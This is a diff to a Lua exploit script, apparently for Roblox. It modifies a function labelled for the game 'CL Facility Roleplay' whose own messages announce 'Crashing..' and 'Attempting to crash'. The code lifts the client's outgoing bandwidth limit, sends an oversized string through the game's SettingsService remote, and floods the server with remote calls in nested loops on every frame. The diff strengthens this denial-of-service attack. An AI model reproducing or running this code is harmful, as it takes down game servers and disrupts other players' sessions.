@@ -780,7 +780,7 @@ end
 function C.K_6416498845() -- CL Facility Roleplay
 	repeat wait() until game:IsLoaded()
 	printconsole('Crashing..')
-
+	
 	local SettingsService;
 	for i,v in pairs(game:GetService('ReplicatedStorage'):GetDescendants()) do
 		if v:IsA('Folder') and v.Name == 'SettingsService' then
@@ -794,9 +794,6 @@ function C.K_6416498845() -- CL Facility Roleplay
 		game:GetService('Players').LocalPlayer:Kick('SettingsService returned nil')
 		return
 	end
-
-	wait(1)
-
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 
@@ -824,14 +821,16 @@ function C.K_6416498845() -- CL Facility Roleplay
 	}
 }
 ]]
+	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
 	SettingsService.RF.Set:InvokeServer({LongString});
 	task.wait(3)	
 	--end
 	warn('Game server completed sending request!')
 	warn('Attempting to crash')
-		
+
 	game:GetService('RunService').RenderStepped:Connect(function()
 		for i = 1, 6500 do
+			spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
 			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
 				pcall(function()
 					SettingsService.RF.Get:InvokeServer()
